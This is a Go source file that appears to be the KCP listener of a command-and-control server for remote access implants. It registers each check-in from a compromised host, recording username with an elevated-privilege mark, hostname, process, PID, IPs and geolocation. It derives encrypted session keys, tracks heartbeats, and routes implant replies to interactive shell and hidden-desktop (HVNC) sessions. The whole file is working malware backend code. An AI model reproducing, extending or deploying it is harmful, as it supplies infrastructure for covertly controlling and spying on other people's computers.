package kcp

import (
	"BackendTemplate/pkg/command"
	"BackendTemplate/pkg/connection"
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/encrypt"
	"BackendTemplate/pkg/notification"
	"BackendTemplate/pkg/qqwry"
	"BackendTemplate/pkg/utils"
	"bufio"
	"encoding/binary"
	"fmt"
	"io"
	"log"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"

	"BackendTemplate/pkg/utils/logx"
	"github.com/xtaci/kcp-go/v5"
)

var KCPClientManger = make(map[string]*kcp.UDPSession)
var Mutex sync.Mutex
var KCPWriteLocks = make(map[string]*sync.Mutex)

// GetWriteLock 获取指定UID的写锁（每个连接独立写互斥，防止并发写帧交错）
func GetWriteLock(uid string) *sync.Mutex {
	Mutex.Lock()
	defer Mutex.Unlock()
	if KCPWriteLocks[uid] == nil {
		KCPWriteLocks[uid] = &sync.Mutex{}
	}
	return KCPWriteLocks[uid]
}

// ReleaseWriteLock 删除指定UID的写锁（断连/清理时调用，防止 map 只增不减）
func ReleaseWriteLock(uid string) {
	Mutex.Lock()
	defer Mutex.Unlock()
	delete(KCPWriteLocks, uid)
}

// XTerm会话广播函数，由api包在初始化时设置（用于交互式终端输出路由）
var BroadcastToXTermSessions func(uid string, data []byte)

// HVNC会话广播函数，由api包在初始化时设置
var BroadcastToHVNCSessions func(uid, sid string, frame []byte)

type ClientTime struct {
	LastHeartbeat time.Time
	TimeoutCount  int
}

var ClientTimeManager = make(map[string]*ClientTime)

// gbkToUtf8 将GBK编码转换为UTF-8 (已迁移到utils.ProcessShellOutput)
func gbkToUtf8(data []byte) ([]byte, error) {
	// 使用新的统一编码处理器
	return utils.ProcessShellOutput(data)
}

// HandleKCPConnection 反向 KCP 客户端连接处理（监听器 Accept 得到）
func HandleKCPConnection(conn *kcp.UDPSession) {
	HandleKCPConnectionFor(conn, "kcp")
}

// HandleKCPForwardConnection 正向 KCP 客户端连接处理（服务端拨号连入目标）
func HandleKCPForwardConnection(conn *kcp.UDPSession) {
	HandleKCPConnectionFor(conn, "kcp_forward")
}

// HandleKCPForwardConnectionWithKeys 正向 KCP 连接处理（显式会话密钥）
func HandleKCPForwardConnectionWithKeys(conn *kcp.UDPSession, masterKey, salt []byte) {
	HandleKCPConnectionForWithKeys(conn, "kcp_forward", masterKey, salt)
}

// HandleKCPConnectionFor 按监听器类型处理 KCP 连接（反向 kcp / 正向 kcp_forward 共用）
func HandleKCPConnectionFor(conn *kcp.UDPSession, listenerType string) {
	HandleKCPConnectionForWithKeys(conn, listenerType, nil, nil)
}

// HandleKCPConnectionForWithKeys 支持显式会话密钥覆盖（正向连接自定义密钥时使用；nil 则用 GetListenerKeyConfig）
func HandleKCPConnectionForWithKeys(conn *kcp.UDPSession, listenerType string, masterKeyOverride, saltOverride []byte) {
	// 监听器主密钥（MetaInfo 传输的 AES-GCM 解密用）
	metaMasterKey, _ := encrypt.GetListenerKeyConfigForForward(listenerType)
	if len(masterKeyOverride) > 0 && len(saltOverride) > 0 {
		metaMasterKey, _ = encrypt.NormalizeListenerKeyConfig(masterKeyOverride, saltOverride)
	}
	// 崩溃防护：任何 panic 都记录并关闭连接，不让异常扩散到整个进程
	defer func() {
		if r := recover(); r != nil {
			logx.Errorf("❌ [KCP-RECOVER] 连接处理panic已捕获: %v (listener=%s)\n", r, listenerType)
		}
	}()

	// 记录客户端UID，用于连接断开时清理
	var currentUID string
	clientIP := conn.RemoteAddr().String()
	connectionID := fmt.Sprintf("kcp_%s_%d", listenerType, time.Now().UnixNano())

	// 延迟清理连接 - 与 TCP 和 WebSocket 保持一致的完整清理机制
	defer func() {
		if currentUID != "" {
			// 从连接池移除（与 TCP 一致，覆盖 KCP 协议）
			if connection.GlobalConnectionManager != nil {
				connection.GlobalConnectionManager.RemoveConnection(connectionID)
			}
			logx.Infof("🔌 [KCP断开] 客户端连接断开，清理状态: %s\n", currentUID)

			// 【振荡修复】仅当映射仍指向本连接时才删除：客户端重连后
			// KCPClientManger[uid] 已指向新连接，旧连接 defer 清理误删新连接映射
			Mutex.Lock()
			if cur, ok := KCPClientManger[currentUID]; ok && cur == conn {
				delete(KCPClientManger, currentUID)
			}
			delete(ClientTimeManager, currentUID)
			Mutex.Unlock()
			// 清理写锁条目（防止 map 只增不减）
			ReleaseWriteLock(currentUID)
			// 清理全部内存队列并广播离线信号
			command.CleanupClientQueues(currentUID)
			// 统一离线检测器注销（仅当仍登记本 UID 时注销，防新连接被旧连接注销）
			if connection.GlobalOfflineDetector != nil && connection.GlobalOfflineDetector.IsRegistered(currentUID) {
				connection.GlobalOfflineDetector.Unregister(currentUID)
			}

			connection.MuClientListenerType.Lock()
			if lt, ok := connection.ClientListenerType[currentUID]; ok && lt == listenerType {
				delete(connection.ClientListenerType, currentUID)
			}
			connection.MuClientListenerType.Unlock()

			// 在数据库中标记为离线
			// LogUpdate 统一记结果日志；不用 MarkOffline——其无条件删 ClientListenerType 会破坏上方振荡修复守卫的语义
			affected, err := database.Engine.Where("uid = ?", currentUID).Update(&database.Clients{Online: "2"})
			database.LogUpdate(affected, err, "KCP断连置离线 uid="+currentUID)

			// 实时事件：连接断开也要发布离线事件（原仅超时判离线时发布）
			if command.GlobalEventBus != nil {
				command.PublishEvent(command.EventClientOffline, currentUID, map[string]interface{}{
					"listener": listenerType,
					"reason":   "connection_closed",
				})
			}
			logx.Infof("✅ [KCP断开] 客户端状态已清理: %s\n", currentUID)
		}
		conn.Close()
	}()

	reader := bufio.NewReader(conn)

	// I4: 首条消息读超时（30s）：firstBlood 失败/垃圾流量的 UDP 会话被及时回收。
	// 原无任何读 deadline 且离线检测仅在 firstBlood 成功后注册 → 半开会话与读 goroutine 永久泄漏。
	firstMessage := true
	if err := conn.SetReadDeadline(time.Now().Add(30 * time.Second)); err != nil {
		conn.Close()
		return
	}

	for {
		// 读取消息长度
		var length uint32
		err := binary.Read(reader, binary.BigEndian, &length)
		if firstMessage {
			firstMessage = false
			// 首条消息（firstBlood）已到达，清除超时；后续依赖离线检测器
			conn.SetReadDeadline(time.Time{})
		}
		if err != nil {
			// 增强错误检测，立即检测连接断开
			if strings.Contains(err.Error(), "use of closed network connection") ||
				strings.Contains(err.Error(), "connection reset by peer") ||
				strings.Contains(err.Error(), "EOF") ||
				strings.Contains(err.Error(), "broken pipe") ||
				strings.Contains(err.Error(), "connection refused") ||
				strings.Contains(err.Error(), "network is unreachable") ||
				err == io.EOF {
				logx.Infof("🔌 [KCP断开] 客户端连接断开: %s (错误: %v)\n", clientIP, err)
				return // 触发defer清理
			}
			logx.Errorf("❌ [KCP读取] 读取消息长度失败: %v\n", err)
			return
		}

		// 长度上限校验，防止恶意客户端无界分配内存
		const maxKCPMessageSize = 64 * 1024 * 1024 // 64MB
		if length > maxKCPMessageSize {
			logx.Errorf("❌ [KCP读取] 消息长度超过上限: %d\n", length)
			return
		}

		// 根据长度读取消息内容
		message := make([]byte, length)
		_, err = io.ReadFull(reader, message)
		if err != nil {
			// 增强读取消息内容的错误检测
			if strings.Contains(err.Error(), "use of closed network connection") ||
				strings.Contains(err.Error(), "connection reset by peer") ||
				strings.Contains(err.Error(), "EOF") ||
				strings.Contains(err.Error(), "broken pipe") ||
				strings.Contains(err.Error(), "connection refused") ||
				strings.Contains(err.Error(), "network is unreachable") ||
				err == io.EOF {
				logx.Infof("🔌 [KCP断开] 客户端连接断开: %s (错误: %v)\n", clientIP, err)
				return // 触发defer清理
			}
			logx.Errorf("❌ [KCP读取] 读取消息内容失败: %v\n", err)
			return
		}

		// 至少需要 4 字节消息类型头，防止越界
		if len(message) < 4 {
			logx.Warnf("⚠️ [KCP] 消息长度不足: %d\n", len(message))
			continue
		}
		// 【优化】更新连接池活动时间，防止 idle 清理误杀长连接（与 TCP 一致）
		if connection.GlobalConnectionManager != nil {
			connection.GlobalConnectionManager.UpdateConnectionActivity(connectionID, int64(len(message)), 0)
		}
		msgTypeBytes := message[:4]

		msgType := binary.BigEndian.Uint32(msgTypeBytes)
		switch msgType {
		case 1: //firstBlood
			msg := message[4:]
			tmpMetainfo, err := encrypt.DecodeBase64(msg)
			if err != nil {
				logx.Println(err)
				break
			}
			metainfo, err := encrypt.DecryptWithMasterKeyRaw(tmpMetainfo, metaMasterKey)
			if err != nil {
				logx.Println(err)
				break
			}
			// FirstBlood 元数据长度校验
			if len(metainfo) < 10 {
				logx.Warnf("⚠️ [KCP] FirstBlood元数据长度不足: %d\n", len(metainfo))
				break
			}
			uid := encrypt.BytesToMD5(metainfo)

			// 设置当前UID，用于连接断开时清理
			currentUID = uid
			// 【优化】注册到统一连接池（覆盖 KCP 协议，受 MaxConnections 限制）
			// 【池上限修复】注册失败直接断开（与 TCP/WS 一致），不再绕过 MaxConnections 继续会话
			if connection.GlobalConnectionManager != nil {
				if err := connection.GlobalConnectionManager.AddConnection(connectionID, uid, listenerType, clientIP, conn); err != nil {
					logx.Warnf("⚠️ [KCP连接] 连接池注册失败，断开: %s, %v\n", uid, err)
					return
				}
			}
			logx.Infof("🎆 [KCP连接] 新客户端连接: %s\n", uid)

			// 立即为客户端生成会话密钥（确保与客户端同步）
			if encrypt.GlobalKeyManager != nil {
				// 获取监听器特定的密钥配置（正向连接可显式覆盖）
				masterKey, encryptionSalt := encrypt.GetListenerKeyConfigForForward(listenerType)
				if len(masterKeyOverride) > 0 && len(saltOverride) > 0 {
					// 规范化为 32/16 字节，与客户端占位符切片规则一致
					masterKey, encryptionSalt = encrypt.NormalizeListenerKeyConfig(masterKeyOverride, saltOverride)
				}
				_, err = encrypt.GlobalKeyManager.DeriveSessionKeyForListenerWithKeys(uid, encryptionSalt, masterKey, encryptionSalt)
				if err != nil {
					logx.Warnf("⚠️ [%s-FIRSTBLOOD] 为客户端 %s 生成会话密钥失败: %v\n", listenerType, uid, err)
				} else {
					logx.Infof("🔑 [%s-FIRSTBLOOD] 为客户端 %s 成功生成会话密钥（%s监听器）\n", listenerType, uid, listenerType)
					// 【会话密钥唯一化】每连接随机 nonce 重派生，并经初始密钥下发（type=4|nonce）
					if b64 := command.BuildSessionNonceMsg(uid, encryptionSalt, masterKey); b64 != nil {
						msg := utils.BytesCombine(utils.WriteInt(len(b64)), b64)
						writeLock := GetWriteLock(uid)
						writeLock.Lock()
						if _, werr := conn.Write(msg); werr != nil {
							logx.Warnf("⚠️ [KCP] nonce 下发失败: %s, %v\n", uid, werr)
						}
						writeLock.Unlock()
						logx.Infof("🔑 [KCP] 会话密钥唯一化 nonce 已下发: %s\n", uid)
					}
				}
			}

			Mutex.Lock()
			KCPClientManger[uid] = conn
			Mutex.Unlock()

			connection.MuClientListenerType.Lock()
			connection.ClientListenerType[uid] = listenerType
			connection.MuClientListenerType.Unlock()

			// 注意：已移除隧道管理器功能，改为单端口SOCKS5代理

			var client database.Clients
			exsists, _ := database.Engine.Where("uid = ?", uid).Get(&client)
			if !exsists { // FirstBlood
				processID := binary.BigEndian.Uint32(metainfo[:4])
				flag := int(metainfo[4:5][0])
				ipInt := binary.LittleEndian.Uint32(metainfo[5:9])
				localIP := utils.Uint32ToIP(ipInt).String()
				osInfo := string(metainfo[9:])

				osArray := strings.Split(osInfo, "\t")
				if len(osArray) < 3 {
					logx.Warnf("⚠️ [KCP] FirstBlood系统信息字段不足: %d\n", len(osArray))
					break
				}
				hostName := osArray[0]
				UserName := osArray[1]
				processName := osArray[2]
				clientOs := ""
				if len(osArray) >= 4 {
					clientOs = osArray[3]
				}

				// 外网 ip
				// 获取远程地址
				remoteAddr := conn.RemoteAddr().String()

				externalIp, _, err := net.SplitHostPort(remoteAddr)
				if err != nil {
					// 如果没有端口号，直接返回 RemoteAddr
					externalIp = remoteAddr
				}
				if externalIp == "::1" {
					externalIp = "127.0.0.1"
				}
				address, _ := qqwry.GetLocationByIP(externalIp)

				currentTime := time.Now()
				timeFormat := "2006-01-02 15:04:05"
				formattedTime := currentTime.Format(timeFormat)

				arch := "x86"

				if flag > 8 {
					UserName += "*"
					flag = flag - 8
				}
				if flag > 4 {
					arch = "x64"
				}

				// 从监听器配置中获取心跳参数
				heartbeatTimeout, heartbeatInterval := database.GetListenerHeartbeatConfigByAddr(conn.LocalAddr().String(), listenerType)

				database.Engine.Insert(&database.Clients{Uid: uid, FirstStart: formattedTime, ExternalIP: externalIp, InternalIP: localIP, Username: UserName, Computer: hostName, Process: processName, Pid: strconv.Itoa(int(processID)), Address: address, Arch: arch, Note: "", Sleep: strconv.Itoa(connection.ResolveSleepSeconds(osArray, heartbeatInterval)), Online: "1", Color: "", Listener: listenerType, Os: clientOs, HeartbeatTimeout: heartbeatTimeout, HeartbeatInterval: heartbeatInterval})
				database.Engine.Insert(&database.Shell{Uid: uid, ShellContent: ""})
				database.Engine.Insert(&database.Notes{Uid: uid, Note: ""})

				// 触发客户端上线通知
				if notificationManager := notification.GetNotificationManager(); notificationManager != nil {
					notificationManager.OnClientOnline(uid)
				}
				// B11: 发布客户端上线事件
				if command.GlobalEventBus != nil {
					command.PublishEvent(command.EventClientOnline, uid, map[string]interface{}{
						"listener":    listenerType,
						"username":    UserName,
						"computer":    hostName,
						"external_ip": externalIp,
						"internal_ip": localIP,
						"pid":         strconv.Itoa(int(processID)),
						"arch":        arch,
						"os":          clientOs,
						"process":     processName,
					})
				}

			}
			database.SetClientOnline(uid, listenerType)
			clientTime := &ClientTime{
				LastHeartbeat: time.Now(),
				TimeoutCount:  0,
			}
			Mutex.Lock()
			ClientTimeManager[uid] = clientTime
			Mutex.Unlock()
			// 统一离线检测器注册（心跳间隔取监听器配置——客户端二进制 patch 的同一值；
			// 原硬编码 5（命令休眠语义）→ 心跳间隔 ≥30s 的客户端会被误判离线）
			if connection.GlobalOfflineDetector != nil {
				_, hbInterval := database.GetListenerHeartbeatConfigByAddr(conn.LocalAddr().String(), listenerType)
				// 统一心跳：优先采用客户端上报的真实 sleep（MetaInfo 第5字段），回退监听器配置
				kcpMeta := strings.Split(string(metainfo[9:]), "\t")
				sleepSec := connection.ResolveSleepSeconds(kcpMeta, hbInterval)
				connection.GlobalOfflineDetector.Register(uid, listenerType, sleepSec, func() {
					Mutex.Lock()
					delete(KCPClientManger, uid)
					delete(ClientTimeManager, uid)
					Mutex.Unlock()
					// 清理写锁条目（防止 map 只增不减）
					ReleaseWriteLock(uid)
					// 离线判定时主动关闭实际连接
					conn.Close()
				})
			}
			// 客户端主导模式：移除服务端的复杂心跳检测机制
			// 仅保留快速离线检测用于即时连接状态检测
			go monitorKCPConnection(uid, conn)

		case 2: // otherMsg

			msg := message[4:]
			if len(msg) < 8 {
				logx.Warnf("⚠️ [KCP] 消息体长度不足: %d\n", len(msg))
				break
			}
			metaLen := binary.BigEndian.Uint32(msg[:4])
			if 4+int(metaLen) > len(msg) {
				logx.Warnf("⚠️ [KCP] 元数据长度越界: metaLen=%d, len=%d\n", metaLen, len(msg))
				break
			}
			metaMsg := msg[4 : 4+metaLen]
			realMsg := msg[4+metaLen:]

			tmpMetainfo, err := encrypt.DecodeBase64(metaMsg)
			if err != nil {
				logx.Println(err)
			}
			metainfo, err := encrypt.DecryptWithMasterKeyRaw(tmpMetainfo, metaMasterKey)
			if err != nil {
				logx.Println(err)
			}
			uid := encrypt.BytesToMD5(metainfo)

			// 任何消息都表示客户端活跃（统一离线检测器 Touch，与 TCP 协议行为一致）
			if connection.GlobalOfflineDetector != nil {
				connection.GlobalOfflineDetector.Touch(uid)
			}

			dataBytes, _ := encrypt.DecodeBase64(realMsg)
			// 尝试使用高级会话密钥解密
			dataBytes, err = encrypt.DecryptWithSessionKey(dataBytes, uid)
			if err != nil {
				// 【加密体系改造】不再回落旧加密
				logx.Warnf("⚠️ [%s] 会话密钥解密失败: %v\n", listenerType, err)
				break
			} else {
				logx.Infof("🔓 [KCP] 使用高级会话密钥解密: %s\n", uid)
			}

			// 拆包 + 边界校验统一走 SplitReplyPayload（B4 收敛，短载荷记日志跳过、不断连）
			replyType, data, err := command.SplitReplyPayload(dataBytes)
			if err != nil {
				logx.Errorf("❌ [KCP] %v - UID: %s\n", err, uid)
				continue
			}

			// 客户端回包统一处理（TCP/KCP/WS 三协议共用，见 pkg/command/reply_handlers.go）
			if err := command.HandleClientReply(listenerType, uid, replyType, data, BroadcastToXTermSessions, BroadcastToHVNCSessions); err != nil {
				logx.Warnf("⚠️ [KCP] 处理客户端回包失败 (type=%d): %v\n", replyType, err)
			}
		case 3: // heartBeat - 简化为客户端主导模式
			msg := message[4:]
			tmpMetainfo, err := encrypt.DecodeBase64(msg)
			if err != nil {
				log.Println("心跳包解码失败:", err)
				continue
			}
			metainfo, err := encrypt.DecryptWithMasterKeyRaw(tmpMetainfo, metaMasterKey)
			if err != nil {
				log.Println("心跳包解密失败:", err)
				continue
			}
			uid := encrypt.BytesToMD5(metainfo)

			// 简化心跳处理：只更新最后心跳时间，不再进行服务端主导的超时检测
			Mutex.Lock()
			if clientTime, exists := ClientTimeManager[uid]; exists {
				clientTime.LastHeartbeat = time.Now()
				clientTime.TimeoutCount = 0 // 重置计数器
				// logx.Infof("❤️ [KCP心跳] 收到客户端 %s 心跳包\n", uid)
			}
			Mutex.Unlock()
			// 统一离线检测器 Touch
			if connection.GlobalOfflineDetector != nil {
				connection.GlobalOfflineDetector.Touch(uid)
			}

			// 回复心跳 ack：供客户端用读超时探测半开连接（UDP 黑洞下 KCP 读不报错）
			ackBase64 := command.BuildHeartbeatAckBytes(uid)
			ackMsg := command.FrameHeartbeatAck(ackBase64)
			writeLock := GetWriteLock(uid)
			writeLock.Lock()
			if _, werr := conn.Write(ackMsg); werr != nil {
				logx.Warnf("⚠️ [KCP心跳ACK] 写入失败: %s, 错误: %v\n", uid, werr)
			}
			writeLock.Unlock()

			// 客户端主导模式：服务端不再进行复杂的超时检测，只接收心跳包
		}
	}
}

func SendMessage(uid string, msg []byte) {
	Mutex.Lock()
	defer Mutex.Unlock()
	if conn, ok := KCPClientManger[uid]; ok {
		// 增强写入错误检测，立即检测连接断开
		_, err := conn.Write(msg)
		if err != nil {
			logx.Infof("🔌 [KCP写入] 发送消息失败，连接可能已断开: %s, 错误: %v\n", uid, err)

			// I3: 完整断连清理（原不 close conn → 读循环继续存活等待，
			// 依赖离线检测器 22.5s 兜底；期间连接状态半残）
			conn.Close()

			delete(KCPClientManger, uid)
			delete(ClientTimeManager, uid)
			ReleaseWriteLock(uid)

			connection.MuClientListenerType.Lock()
			delete(connection.ClientListenerType, uid)
			connection.MuClientListenerType.Unlock()

			if connection.GlobalOfflineDetector != nil {
				connection.GlobalOfflineDetector.Unregister(uid)
			}
			command.CleanupClientQueues(uid)

			// 统一离线入口：置 Online=2 + 离线事件 + 队列清理（幂等，上方已清理的映射不受影响）
			connection.MarkOffline(uid, "kcp", "写入失败")
			logx.Infof("✅ [KCP写入] 客户端状态已完整清理: %s\n", uid)
		}
	}
}

// checkRealHeartbeats 已废弃：原服务端主导的心跳检测机制
// 现在改为客户端主导模式，服务端只接收心跳包并更新时间戳
/*
func checkRealHeartbeats(uid string) {
	for {
		// 获取客户端的心跳配置
		var client database.Clients
		database.Engine.Where("uid = ?", uid).Get(&client)

		// 解析心跳间隔（HeartbeatInterval，单位：秒）
		heartbeatInterval := 10 // 默认值
		if client.HeartbeatInterval != "" {
			if interval, err := strconv.Atoi(client.HeartbeatInterval); err == nil && interval > 0 {
				heartbeatInterval = interval
			}
		}

		// 解析心跳超时次数（HeartbeatTimeout，连续超时多少次后判断离线）
		heartbeatTimeout := 30 // 默认值
		if client.HeartbeatTimeout != "" {
			if timeout, err := strconv.Atoi(client.HeartbeatTimeout); err == nil && timeout > 0 {
				heartbeatTimeout = timeout
			}
		}

		// 使用心跳间隔作为检查间隔
		checkInterval := time.Duration(heartbeatInterval) * time.Second
		time.Sleep(checkInterval)

		Mutex.Lock()
		clientTime, exists := ClientTimeManager[uid]
		if !exists {
			// 客户端已被清理，退出心跳检测
			Mutex.Unlock()
			break
		}

		// 检查距离上次心跳的时间
		timeSinceLastHeartbeat := time.Since(clientTime.LastHeartbeat)
		heartbeatIntervalDuration := time.Duration(heartbeatInterval) * time.Second

		// 如果超过心跳间隔时间还没有收到心跳包，则认为超时一次
		if timeSinceLastHeartbeat > heartbeatIntervalDuration {
			clientTime.TimeoutCount++
			// logx.Infof("❤️ [KCP心跳] 客户端 %s 心跳超时 - 第%d次（距离上次心跳 %.1f秒，间隔阈值 %d秒）\n",
			// 	uid, clientTime.TimeoutCount, timeSinceLastHeartbeat.Seconds(), heartbeatInterval)

			// 检查是否达到超时次数阈值
			if clientTime.TimeoutCount >= heartbeatTimeout {
				// 连续超时次数达到阈值，判断客户端离线
				logx.Infof("🔴 [KCP离线] 客户端 %s 真正心跳检测离线（连续超时 %d 次，达到阈值 %d 次）\n",
					uid, clientTime.TimeoutCount, heartbeatTimeout)

				// 标记为离线并清理连接
				database.Engine.Where("uid = ?", uid).Update(&database.Clients{Online: "2"})
				delete(KCPClientManger, uid)
				delete(ClientTimeManager, uid)

				// 清理监听器类型记录
				connection.MuClientListenerType.Lock()
				delete(connection.ClientListenerType, uid)
				connection.MuClientListenerType.Unlock()

				Mutex.Unlock()
				break
			}
		} else {
			// 在心跳间隔内收到了心跳，重置超时计数（这个逻辑其实在心跳处理中已经做了）
			// 这里主要是为了调试信息
			if clientTime.TimeoutCount > 0 {
				logx.Infof("💚 [KCP心跳] 客户端 %s 心跳恢复正常（距离上次心跳 %.1f秒）\n",
					uid, timeSinceLastHeartbeat.Seconds())
			}
		}

		Mutex.Unlock()
	}

	logx.Infof("✅ [KCP心跳] 客户端 %s 心跳检测协程退出\n", uid)
}

*/

// monitorKCPConnection 监控KCP连接：仅跟踪连接是否仍被管理（离线判定统一由 OfflineDetector 负责）。
// 原实现每 5s 无锁写入 4 字节测试包（可能破坏帧边界）并自行清理（与 OfflineDetector 双份判定），已移除。
func monitorKCPConnection(uid string, conn *kcp.UDPSession) {
	logx.Debugf("🔍 [KCP监控] 启动连接状态监控: %s\n", uid)

	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			// 检查连接是否还在管理器中
			Mutex.Lock()
			_, exists := KCPClientManger[uid]
			Mutex.Unlock()
			if !exists {
				// 连接已被清理，退出监控
				logx.Debugf("🔍 [KCP监控] 连接已清理，退出监控: %s\n", uid)
				return
			}
		}
	}
}
